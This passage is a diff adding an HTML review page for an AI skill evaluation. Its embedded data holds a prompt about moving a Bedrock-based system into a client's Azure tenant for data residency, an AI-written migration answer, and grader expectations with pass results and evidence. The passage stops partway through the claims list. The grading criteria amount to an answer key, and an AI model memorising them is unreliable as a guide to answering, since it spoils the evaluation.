@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Eval Review</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&family=Lora:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js" integrity="sha384-EnyY0/GSHQGSxSgMwaIPzSESbqoOLSexfnSMN2AP+39Ckmn92stwABZynq1JyzdT" crossorigin="anonymous"></script>
+  <style>
+    :root {
+      --bg: #faf9f5;
+      --surface: #ffffff;
+      --border: #e8e6dc;
+      --text: #141413;
+      --text-muted: #b0aea5;
+      --accent: #d97757;
+      --accent-hover: #c4613f;
+      --green: #788c5d;
+      --green-bg: #eef2e8;
+      --red: #c44;
+      --red-bg: #fceaea;
+      --header-bg: #141413;
+      --header-text: #faf9f5;
+      --radius: 6px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Lora', Georgia, serif;
+      background: var(--bg);
+      color: var(--text);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ---- Header ---- */
+    .header {
+      background: var(--header-bg);
+      color: var(--header-text);
+      padding: 1rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-shrink: 0;
+    }
+    .header h1 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 1.25rem;
+      font-weight: 600;
+    }
+    .header .instructions {
+      font-size: 0.8rem;
+      opacity: 0.7;
+      margin-top: 0.25rem;
+    }
+    .header .progress {
+      font-size: 0.875rem;
+      opacity: 0.8;
+      text-align: right;
+    }
+
+    /* ---- Main content ---- */
+    .main {
+      flex: 1;
+      overflow-y: auto;
+      padding: 1.5rem 2rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+
+    /* ---- Sections ---- */
+    .section {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      flex-shrink: 0;
+    }
+    .section-header {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.75rem 1rem;
+      font-size: 0.75rem;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+      background: var(--bg);
+    }
+    .section-body {
+      padding: 1rem;
+    }
+
+    /* ---- Config badge ---- */
+    .config-badge {
+      display: inline-block;
+      padding: 0.2rem 0.625rem;
+      border-radius: 9999px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.6875rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+      margin-left: 0.75rem;
+      vertical-align: middle;
+    }
+    .config-badge.config-primary {
+      background: rgba(33, 150, 243, 0.12);
+      color: #1976d2;
+    }
+    .config-badge.config-baseline {
+      background: rgba(255, 193, 7, 0.15);
+      color: #f57f17;
+    }
+
+    /* ---- Prompt ---- */
+    .prompt-text {
+      white-space: pre-wrap;
+      font-size: 0.9375rem;
+      line-height: 1.6;
+    }
+
+    /* ---- Outputs ---- */
+    .output-file {
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+    }
+    .output-file + .output-file {
+      margin-top: 1rem;
+    }
+    .output-file-header {
+      padding: 0.5rem 0.75rem;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+      font-family: 'SF Mono', SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .output-file-header .dl-btn {
+      font-size: 0.7rem;
+      color: var(--accent);
+      text-decoration: none;
+      cursor: pointer;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-weight: 500;
+      opacity: 0.8;
+    }
+    .output-file-header .dl-btn:hover {
+      opacity: 1;
+      text-decoration: underline;
+    }
+    .output-file-content {
+      padding: 0.75rem;
+      overflow-x: auto;
+    }
+    .output-file-content pre {
+      font-size: 0.8125rem;
+      line-height: 1.5;
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-family: 'SF Mono', SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
+    }
+    .output-file-content img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 4px;
+    }
+    .output-file-content iframe {
+      width: 100%;
+      height: 600px;
+      border: none;
+    }
+    .output-file-content table {
+      border-collapse: collapse;
+      font-size: 0.8125rem;
+      width: 100%;
+    }
+    .output-file-content table td,
+    .output-file-content table th {
+      border: 1px solid var(--border);
+      padding: 0.375rem 0.5rem;
+      text-align: left;
+    }
+    .output-file-content table th {
+      background: var(--bg);
+      font-weight: 600;
+    }
+    .output-file-content .download-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.5rem 1rem;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--accent);
+      text-decoration: none;
+      font-size: 0.875rem;
+      cursor: pointer;
+    }
+    .output-file-content .download-link:hover {
+      background: var(--border);
+    }
+    .empty-state {
+      color: var(--text-muted);
+      font-style: italic;
+      padding: 2rem;
+      text-align: center;
+    }
+
+    /* ---- Feedback ---- */
+    .prev-feedback {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.625rem 0.75rem;
+      margin-top: 0.75rem;
+      font-size: 0.8125rem;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+    .prev-feedback-label {
+      font-size: 0.7rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      margin-bottom: 0.25rem;
+      color: var(--text-muted);
+    }
+    .feedback-textarea {
+      width: 100%;
+      min-height: 100px;
+      padding: 0.75rem;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      font-family: inherit;
+      font-size: 0.9375rem;
+      line-height: 1.5;
+      resize: vertical;
+      color: var(--text);
+    }
+    .feedback-textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+    }
+    .feedback-status {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      margin-top: 0.5rem;
+      min-height: 1.1em;
+    }
+
+    /* ---- Grades (collapsible) ---- */
+    .grades-toggle {
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      user-select: none;
+    }
+    .grades-toggle:hover {
+      color: var(--accent);
+    }
+    .grades-toggle .arrow {
+      margin-right: 0.5rem;
+      transition: transform 0.15s;
+      font-size: 0.75rem;
+    }
+    .grades-toggle .arrow.open {
+      transform: rotate(90deg);
+    }
+    .grades-content {
+      display: none;
+      margin-top: 0.75rem;
+    }
+    .grades-content.open {
+      display: block;
+    }
+    .grades-summary {
+      font-size: 0.875rem;
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .grade-badge {
+      display: inline-block;
+      padding: 0.125rem 0.5rem;
+      border-radius: 9999px;
+      font-size: 0.75rem;
+      font-weight: 600;
+    }
+    .grade-pass { background: var(--green-bg); color: var(--green); }
+    .grade-fail { background: var(--red-bg); color: var(--red); }
+    .assertion-list {
+      list-style: none;
+    }
+    .assertion-item {
+      padding: 0.625rem 0;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.8125rem;
+    }
+    .assertion-item:last-child { border-bottom: none; }
+    .assertion-status {
+      font-weight: 600;
+      margin-right: 0.5rem;
+    }
+    .assertion-status.pass { color: var(--green); }
+    .assertion-status.fail { color: var(--red); }
+    .assertion-evidence {
+      color: var(--text-muted);
+      font-size: 0.75rem;
+      margin-top: 0.25rem;
+      padding-left: 1.5rem;
+    }
+
+    /* ---- View tabs ---- */
+    .view-tabs {
+      display: flex;
+      gap: 0;
+      padding: 0 2rem;
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    .view-tab {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.625rem 1.25rem;
+      font-size: 0.8125rem;
+      font-weight: 500;
+      cursor: pointer;
+      border: none;
+      background: none;
+      color: var(--text-muted);
+      border-bottom: 2px solid transparent;
+      transition: all 0.15s;
+    }
+    .view-tab:hover { color: var(--text); }
+    .view-tab.active {
+      color: var(--accent);
+      border-bottom-color: var(--accent);
+    }
+    .view-panel { display: none; }
+    .view-panel.active { display: flex; flex-direction: column; flex: 1; overflow: hidden; }
+
+    /* ---- Benchmark view ---- */
+    .benchmark-view {
+      padding: 1.5rem 2rem;
+      overflow-y: auto;
+      flex: 1;
+    }
+    .benchmark-table {
+      border-collapse: collapse;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      font-size: 0.8125rem;
+      width: 100%;
+      margin-bottom: 1.5rem;
+    }
+    .benchmark-table th, .benchmark-table td {
+      padding: 0.625rem 0.75rem;
+      text-align: left;
+      border: 1px solid var(--border);
+    }
+    .benchmark-table th {
+      font-family: 'Poppins', sans-serif;
+      background: var(--header-bg);
+      color: var(--header-text);
+      font-weight: 500;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .benchmark-table tr:hover { background: var(--bg); }
+    .benchmark-table tr.benchmark-row-with { background: rgba(33, 150, 243, 0.06); }
+    .benchmark-table tr.benchmark-row-without { background: rgba(255, 193, 7, 0.06); }
+    .benchmark-table tr.benchmark-row-with:hover { background: rgba(33, 150, 243, 0.12); }
+    .benchmark-table tr.benchmark-row-without:hover { background: rgba(255, 193, 7, 0.12); }
+    .benchmark-table tr.benchmark-row-avg { font-weight: 600; border-top: 2px solid var(--border); }
+    .benchmark-table tr.benchmark-row-avg.benchmark-row-with { background: rgba(33, 150, 243, 0.12); }
+    .benchmark-table tr.benchmark-row-avg.benchmark-row-without { background: rgba(255, 193, 7, 0.12); }
+    .benchmark-delta-positive { color: var(--green); font-weight: 600; }
+    .benchmark-delta-negative { color: var(--red); font-weight: 600; }
+    .benchmark-notes {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1rem;
+    }
+    .benchmark-notes h3 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.875rem;
+      margin-bottom: 0.75rem;
+    }
+    .benchmark-notes ul {
+      list-style: disc;
+      padding-left: 1.25rem;
+    }
+    .benchmark-notes li {
+      font-size: 0.8125rem;
+      line-height: 1.6;
+      margin-bottom: 0.375rem;
+    }
+    .benchmark-empty {
+      color: var(--text-muted);
+      font-style: italic;
+      text-align: center;
+      padding: 3rem;
+    }
+
+    /* ---- Navigation ---- */
+    .nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+      border-top: 1px solid var(--border);
+      background: var(--surface);
+      flex-shrink: 0;
+    }
+    .nav-btn {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.5rem 1.25rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      cursor: pointer;
+      font-size: 0.875rem;
+      font-weight: 500;
+      color: var(--text);
+      transition: all 0.15s;
+    }
+    .nav-btn:hover:not(:disabled) {
+      background: var(--bg);
+      border-color: var(--text-muted);
+    }
+    .nav-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+    .done-btn {
+      font-family: 'Poppins', sans-serif;
+      padding: 0.5rem 1.5rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      color: var(--text);
+      cursor: pointer;
+      font-size: 0.875rem;
+      font-weight: 500;
+      transition: all 0.15s;
+    }
+    .done-btn:hover {
+      background: var(--bg);
+      border-color: var(--text-muted);
+    }
+    .done-btn.ready {
+      border: none;
+      background: var(--accent);
+      color: white;
+      font-weight: 600;
+    }
+    .done-btn.ready:hover {
+      background: var(--accent-hover);
+    }
+    /* ---- Done overlay ---- */
+    .done-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+    }
+    .done-overlay.visible {
+      display: flex;
+    }
+    .done-card {
+      background: var(--surface);
+      border-radius: 12px;
+      padding: 2rem 3rem;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 500px;
+    }
+    .done-card h2 {
+      font-size: 1.5rem;
+      margin-bottom: 0.5rem;
+    }
+    .done-card p {
+      color: var(--text-muted);
+      margin-bottom: 1.5rem;
+      line-height: 1.5;
+    }
+    .done-card .btn-row {
+      display: flex;
+      gap: 0.5rem;
+      justify-content: center;
+    }
+    .done-card button {
+      padding: 0.5rem 1.25rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      cursor: pointer;
+      font-size: 0.875rem;
+    }
+    .done-card button:hover {
+      background: var(--bg);
+    }
+    /* ---- Toast ---- */
+    .toast {
+      position: fixed;
+      bottom: 5rem;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--header-bg);
+      color: var(--header-text);
+      padding: 0.625rem 1.25rem;
+      border-radius: var(--radius);
+      font-size: 0.875rem;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+      z-index: 200;
+    }
+    .toast.visible {
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+  <div id="app" style="height:100vh; display:flex; flex-direction:column;">
+    <div class="header">
+      <div>
+        <h1>Eval Review: <span id="skill-name"></span></h1>
+        <div class="instructions">Review each output and leave feedback below. Navigate with arrow keys or buttons. When done, copy feedback and paste into Claude Code.</div>
+      </div>
+      <div class="progress" id="progress"></div>
+    </div>
+
+    <!-- View tabs (only shown when benchmark data exists) -->
+    <div class="view-tabs" id="view-tabs" style="display:none;">
+      <button class="view-tab active" onclick="switchView('outputs')">Outputs</button>
+      <button class="view-tab" onclick="switchView('benchmark')">Benchmark</button>
+    </div>
+
+    <!-- Outputs panel (qualitative review) -->
+    <div class="view-panel active" id="panel-outputs">
+    <div class="main">
+      <!-- Prompt -->
+      <div class="section">
+        <div class="section-header">Prompt <span class="config-badge" id="config-badge" style="display:none;"></span></div>
+        <div class="section-body">
+          <div class="prompt-text" id="prompt-text"></div>
+        </div>
+      </div>
+
+      <!-- Outputs -->
+      <div class="section">
+        <div class="section-header">Output</div>
+        <div class="section-body" id="outputs-body">
+          <div class="empty-state">No output files found</div>
+        </div>
+      </div>
+
+      <!-- Previous Output (collapsible) -->
+      <div class="section" id="prev-outputs-section" style="display:none;">
+        <div class="section-header">
+          <div class="grades-toggle" onclick="togglePrevOutputs()">
+            <span class="arrow" id="prev-outputs-arrow">&#9654;</span>
+            Previous Output
+          </div>
+        </div>
+        <div class="grades-content" id="prev-outputs-content"></div>
+      </div>
+
+      <!-- Grades (collapsible) -->
+      <div class="section" id="grades-section" style="display:none;">
+        <div class="section-header">
+          <div class="grades-toggle" onclick="toggleGrades()">
+            <span class="arrow" id="grades-arrow">&#9654;</span>
+            Formal Grades
+          </div>
+        </div>
+        <div class="grades-content" id="grades-content"></div>
+      </div>
+
+      <!-- Feedback -->
+      <div class="section">
+        <div class="section-header">Your Feedback</div>
+        <div class="section-body">
+          <textarea
+            class="feedback-textarea"
+            id="feedback"
+            placeholder="What do you think of this output? Any issues, suggestions, or things that look great?"
+          ></textarea>
+          <div class="feedback-status" id="feedback-status"></div>
+          <div class="prev-feedback" id="prev-feedback" style="display:none;">
+            <div class="prev-feedback-label">Previous feedback</div>
+            <div id="prev-feedback-text"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="nav" id="outputs-nav">
+      <button class="nav-btn" id="prev-btn" onclick="navigate(-1)">&#8592; Previous</button>
+      <button class="done-btn" id="done-btn" onclick="showDoneDialog()">Submit All Reviews</button>
+      <button class="nav-btn" id="next-btn" onclick="navigate(1)">Next &#8594;</button>
+    </div>
+    </div><!-- end panel-outputs -->
+
+    <!-- Benchmark panel (quantitative stats) -->
+    <div class="view-panel" id="panel-benchmark">
+      <div class="benchmark-view" id="benchmark-content">
+        <div class="benchmark-empty">No benchmark data available. Run a benchmark to see quantitative results here.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Done overlay -->
+  <div class="done-overlay" id="done-overlay">
+    <div class="done-card">
+      <h2>Review Complete</h2>
+      <p>Your feedback has been saved. Go back to your Claude Code session and tell Claude you're done reviewing.</p>
+      <div class="btn-row">
+        <button onclick="closeDoneDialog()">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // ---- Embedded data (injected by generate_review.py) ----
+    const EMBEDDED_DATA = {"skill_name": "ai-platform-implementation", "runs": [{"id": "eval-0-residency-boundary-aws-to-azure-tenant-with_skill", "prompt": "customer won't let any of their data leave their azure tenant, but we built everything on AWS/Bedrock. what actually has to move and what can stay?", "eval_id": 0, "outputs": [{"name": "answer.md", "type": "text", "content": "# Residency boundary: what moves into the Azure tenant, what stays on AWS\n\n**Short answer:** everything that *touches client data* moves \u2014 and that list is longer than people expect, because it includes the model endpoint, the trace store, and the log destinations. Everything that touches only *your* code and *synthetic* data stays: CI, image build, dev/demo tiers, eval corpora, Terraform. Bedrock does not move \u2014 you replace it, because there is no way to put a Bedrock endpoint inside an Azure subscription.\n\nBefore you design anything, ask one question that could collapse this whole exercise (below, \u00a75).\n\n---\n\n## 1. Draw the boundary first \u2014 it invalidates every downstream decision if you get it wrong\n\nThe compliance boundary is **the client's Azure tenant**, and the rule is: *every component that touches client data lives inside it.*\n\n```\n\u250c\u2500 Client Azure tenant (boundary) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                   \u2502\n\u2502  AKS: ui \u00b7 gateway \u00b7 product-api \u00b7 qa-api                         \u2502\n\u2502  Trace store (self-hosted Langfuse/Phoenix + OTLP)                \u2502\n\u2502  Azure Database for PostgreSQL \u00b7 Blob (artifacts) \u00b7 Key Vault CMK \u2502\n\u2502  Model endpoint: Azure AI Foundry, private endpoint               \u2502\n\u2502  Guardrail: Azure AI Content Safety at the endpoint               \u2502\n\u2502  Logs: Activity Log + Foundry diagnostics \u2192 immutable Storage     \u2502\n\u2502                                                                   \u2502\n\u2514\u2500\u2500 egress: default-deny; named private endpoints only \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u25b2\n        \u2502 what crosses OUT: nothing containing client data.\n        \u2502 Aggregated metrics / eval scores only, by explicit written agreement.\n```\n\n## 2. What has to move\n\n| Component | Today | In their tenant | Why it's non-negotiable |\n|---|---|---|---|\n| **Model endpoint** | Bedrock | **Azure AI Foundry** endpoint in *their* subscription, private endpoint, public network access disabled | Prompts and completions are client data. A PrivateLink-to-your-Bedrock story still terminates in *your* AWS account's region \u2014 that is data leaving their tenant. This is the item with no workaround. |\n| **Agent + gateway runtime** | EKS | **AKS**, private cluster, private API server | It holds the payloads in memory and on disk |\n| **Trace store** | wherever it is now | **Self-hosted in-tenant.** No SaaS observability \u2014 no Langfuse Cloud, no Datadog LLM Obs, no vendor-side OTLP collector | Spans carry the raw prompts. This is the #1 silently-violated boundary. |\n| **Log destinations** | CloudTrail / Bedrock invocation logs \u2192 your bucket | **Foundry diagnostic settings + Activity Log + AKS control-plane logs \u2192 immutable Storage in their tenant** | Shipping model-invocation logs to a vendor-owned aggregation account moves client data across the boundary *through the telemetry channel*. This is the one everybody forgets. |\n| **Primary data stores** | RDS, S3 | Azure Database for PostgreSQL, Blob, **customer-managed keys in their Key Vault** | Obvious, but the *key* matters: CMK in their Key Vault gives them an IAM-independent revocation story \u2014 \"delete the key\" is a real offboarding answer |\n| **Managed guardrail** | Bedrock Guardrails | **Azure AI Content Safety** (Prompt Shields, PII detection, groundedness) attached at the Foundry endpoint | Guardrail evaluation sees the prompt |\n| **Ingress / auth** | your ALB + WAF | App Gateway/Front Door + WAF, **their SSO**, tenant-owned certs | Auth happens before any request reaches an agent |\n| **Registry (prod pulls)** | your ECR | **Their ACR**, images promoted in signed | Cluster follows the no-internet-egress rule, so it can't pull from your ECR anyway |\n\n## 3. What can stay on AWS\n\nOnly if the tier **structurally cannot hold client data** \u2014 enforced twice: the API refuses non-`SYNTHETIC` data classes *and* the sandbox has no network route or credential to any client system. A developer must not be able to violate the residency clause by accident.\n\n| Stays | Condition |\n|---|---|\n| **dev / CI tier** (including Bedrock for dev-time model calls) | `SYNTHETIC` data only, enforced at the API, not by agreement |\n| **demo tier** | synthetic only, isolated namespace, **zero connections to client systems** |\n| **CI pipeline**: build, SBOM, vuln scan, cosign signing, eval + red-team gates | CI never sees client data. It produces signed artifacts; the tenant verifies signatures at admission. |\n| **Terraform/Terragrunt + Helm charts, prompts, agent code, eval golden sets, red-team corpus** | These are your IP, not their data |\n| **Aggregated metrics / eval scores crossing back to you** | Only by explicit written agreement, and only aggregates. Nail this down in the contract *now* \u2014 it's the difference between \"we monitor the deployment\" and a residency breach. |\n\n## 4. What actually changes in the code \u2014 and how to size it in an hour\n\nIf you built on Kubernetes with a provider-bindings layer, this is a values-layer port, not a rewrite:\n\n- **Model client**: `bedrock-runtime` \u2192 Azure AI Foundry SDK. **This is only cheap if every Bedrock call already goes through one wrapper.** Go grep for `bedrock-runtime` / `InvokeModel` / `Converse` across the services right now \u2014 if it appears in more than one module, that scattered call surface *is* your migration cost, and it's also the thing that makes your egress redactor bypassable. Fix it by collapsing to a single gateway client either way.\n- **Workload identity**: EKS Pod Identity/IRSA \u2192 **AKS Workload Identity** (federated managed identity). Same property, different annotation: the Helm values that name a role ARN name a client ID instead. No static keys, on either cloud.\n- **Object storage / secrets clients**: S3 \u2192 Blob, Secrets Manager \u2192 Key Vault.\n- **Model family**: check whether the exact model you evaluated is available in Foundry **in their required region**. If not, a model swap rides the full eval + red-team gate like any other model change \u2014 budget for that, don't discover it.\n- **Unchanged**: agent loop, prompts, schema validation, capability manifests, redaction gateway, business logic.\n\nTwo things you inherit from Bedrock that you must re-establish on Azure, not assume:\n- **The data-use commitment.** AWS's is published (prompts not used for training, providers in isolated accounts). Get the Azure/Foundry equivalent in writing for the specific models and features you use \u2014 and note that BAA/DPA coverage varies by *endpoint and feature*; preview features and telemetry are commonly out of scope even when the base endpoint is in.\n- **Single-region processing.** Bedrock's Global cross-region inference has an Azure analog in Global vs. Data Zone vs. Regional deployments. For a residency-constrained client: **Regional deployment only.** Never Global.\n\n## 5. Challenge the premise before you spend a quarter on this\n\nAsk the client: **\"tenant\" or \"cloud\"?** Those are different clauses.\n\n- If the clause is *\"our data stays in infrastructure we own and control\"* \u2014 an **AWS account inside their organization**, with your platform deployed into it, satisfies it. Bedrock stays, the port collapses to a deploy-target change, and you keep every control you already built. Many \"no data leaves our tenant\" clauses are actually this, written by someone who assumed Azure because that's what the rest of the company runs on.\n- If the clause is genuinely *\"Azure, our subscription, our EA\"* \u2014 then \u00a72 is the real scope and the model layer swap is unavoidable.\n\nThe cost difference between those two readings is enormous. Get the answer in writing before you architect. Also settle now, not at handover: which region, who operates the platform after go-live, and what read access their platform team gets (dashboards yes; raw prompt payloads under their own policy, with logged access).\n\n## 6. Off by default on Azure \u2014 the enablement checklist a reviewer actually wants\n\nThe AWS half of this you already know. These are the Azure equivalents, and the compliance posture is only as real as this list:\n\n| Control | Default | Action |\n|---|---|---|\n| **Foundry diagnostic settings** (model request/response logging) | **off** | enable \u2192 immutable Storage account in-tenant |\n| **Foundry public network access** | **enabled** | disable; private endpoint only |\n| **AKS control-plane diagnostic logs** (kube-apiserver, audit, controller-manager, scheduler) | **off** | enable all \u2192 Log Analytics in-tenant |\n| **Storage immutability policy (WORM), locked** | **off** | enable \u2014 this is the Object Lock COMPLIANCE-mode equivalent, and it's what converts \"we keep logs\" into \"our logs are evidence\" |\n| **CMK on Storage / PostgreSQL / AKS secrets (KMS etcd encryption)** | platform-managed keys | switch to CMK in their Key Vault |\n| **AKS NetworkPolicy** (Cilium or Azure NPM) | **no policy = allow-all** | default-deny ingress+egress per namespace, then named flows |\n| **Egress** | NAT-to-anywhere | default-deny; private endpoints for Foundry, Storage, PostgreSQL, Key Vault, ACR \u2014 target *zero* internet egress from workload subnets |\n| **DNS** | resolves anything | private resolver only, external resolvers blocked in NetworkPolicy, query logging on. **DNS is an exfil channel** \u2014 an agent that can resolve arbitrary names can tunnel data out. |\n| **Azure AI Content Safety** attached at the endpoint | not automatic | attach; Prompt Shields + PII in *redact* mode (not block \u2014 false positives teach the team to route around the control) |\n| **Defender for Cloud** | partial | on, findings routed |\n\nRetention: propose long (multi-year) for audit **metadata**, and a short, explicitly-agreed window for **payload** stores. Write both into the client agreement. Retention chosen by nobody is the finding.\n\n## 7. Alarms that must survive the move\n\n- Model invocation by **any identity other than the two agent workload identities** \u2014 the \"someone found a credential\" alarm.\n- Invocation of a **model deployment outside the allowlist** \u2014 should be impossible (RBAC + policy + private endpoint); firing means a policy layer changed.\n- Break-glass role assumption; changes to immutable-storage policies; NetworkPolicy or private-endpoint policy modification; `kubectl exec` into agent pods in prod.\n\n## 8. What to show their security team\n\nOne boundary diagram (\u00a71) with the named flows overlaid, plus two live proofs that land better than any document:\n\n1. `kubectl` into an agent pod \u2192 `curl https://example.com` blocked, external DNS resolution blocked. Thirty seconds.\n2. The private-endpoint policies, Azure Policy assignments, and NetworkPolicies **as code in the IaC repo** \u2014 allowlists as versioned artifacts with a review history, not console settings. Back them with policy-as-code assertions on the plan (Checkov/OPA): diagnostic logging can't be disabled, immutability can't be removed, endpoints can't be widened \u2014 so \"someone turned off audit logging\" is a failed plan, not a discovered incident.\n\n---\n\n**The application-layer half:** the redaction gateway, capability manifests, data-class enforcement at the API, and schema validation are code, not infrastructure \u2014 the network only guarantees they can't be *bypassed*. Those belong in `ai-engineering-implementation`.\n"}], "grading": {"eval_id": 0, "eval_name": "residency-boundary-aws-to-azure-tenant", "configuration": "with_skill", "expectations": [{"text": "States that the MODEL ENDPOINT must move inside the tenant (e.g. Azure AI Foundry / Azure OpenAI) \u2014 Bedrock cannot serve the data-bearing calls", "passed": true, "evidence": "\u00a72 table row: '**Model endpoint** | Bedrock | **Azure AI Foundry** endpoint in *their* subscription, private endpoint, public network access disabled | Prompts and completions are client data. A PrivateLink-to-your-Bedrock story still terminates in *your* AWS account's region \u2014 that is data leaving their tenant. This is the item with no workaround.' Also the lede: 'Bedrock does not move \u2014 you replace it, because there is no way to put a Bedrock endpoint inside an Azure subscription.'"}, {"text": "States that the TRACE / OBSERVABILITY store must also move inside the boundary because traces contain client data", "passed": true, "evidence": "\u00a72: '**Trace store** | wherever it is now | **Self-hosted in-tenant.** No SaaS observability ... | Spans carry the raw prompts. This is the #1 silently-violated boundary.' The boundary diagram in \u00a71 places 'Trace store (self-hosted Langfuse/Phoenix + OTLP)' inside the tenant."}, {"text": "States that LOG and AUDIT destinations must also live inside the tenant (not shipped to a vendor-owned aggregation account)", "passed": true, "evidence": "\u00a72: '**Log destinations** | CloudTrail / Bedrock invocation logs \u2192 your bucket | **Foundry diagnostic settings + Activity Log + AKS control-plane logs \u2192 immutable Storage in their tenant** | Shipping model-invocation logs to a vendor-owned aggregation account moves client data across the boundary *through the telemetry channel*.'"}, {"text": "Explicitly warns that a SaaS observability vendor (e.g. hosted Langfuse/Datadog) breaks the residency clause", "passed": true, "evidence": "\u00a72 trace-store row names vendors by name: 'No SaaS observability \u2014 no Langfuse Cloud, no Datadog LLM Obs, no vendor-side OTLP collector'."}, {"text": "Identifies what CAN stay outside: things containing no client data (e.g. CI/CD, container registry/images, IaC, source code, dev/synthetic environments)", "passed": true, "evidence": "\u00a73 'What can stay on AWS' table lists dev/CI tier (SYNTHETIC data only), demo tier, 'CI pipeline: build, SBOM, vuln scan, cosign signing, eval + red-team gates \u2014 CI never sees client data', and 'Terraform/Terragrunt + Helm charts, prompts, agent code, eval golden sets, red-team corpus'. The gating condition is stated: 'Only if the tier structurally cannot hold client data \u2014 enforced twice'."}, {"text": "Notes that a cloud-agnostic Kubernetes core is what makes the move feasible and that only provider bindings change", "passed": true, "evidence": "\u00a74: 'If you built on Kubernetes with a provider-bindings layer, this is a values-layer port, not a rewrite' \u2014 then enumerates only the bindings that change (bedrock-runtime \u2192 Foundry SDK, IRSA \u2192 AKS Workload Identity, S3 \u2192 Blob, Secrets Manager \u2192 Key Vault) and what does not: 'Unchanged: agent loop, prompts, schema validation, capability manifests, redaction gateway, business logic.'"}, {"text": "Distinguishes the compliance boundary as 'everything client data touches' rather than only the app and database", "passed": true, "evidence": "\u00a71: 'The compliance boundary is the client's Azure tenant, and the rule is: every component that touches client data lives inside it.' The lede makes the contrast explicit: 'that list is longer than people expect, because it includes the model endpoint, the trace store, and the log destinations.'"}], "summary": {"passed": 7, "failed": 0, "total": 7, "pass_rate": 1.0}, "execution_metrics": {"output_chars": 8847, "total_tokens": 53771}, "timing": {"executor_duration_seconds": 110.8, "total_duration_seconds": 110.8}, "claims": [{"claim": "Bedrock's Global cross-region inference has an Azure analog in Global vs. Data Zone vs. Regional deployments; a residency-constrained client must use Regional only", "type": "factual", "verified": true, "evidence": "Azure OpenAI/Foundry does offer Global, Data Zone and Regional deployment types with different processing-locality guarantees. The recommendation (Regional only) is the correct one for a tenant-residency clause and is a non-obvious control most answers omit."}, {"claim": "BAA/DPA coverage varies by endpoint and feature; preview 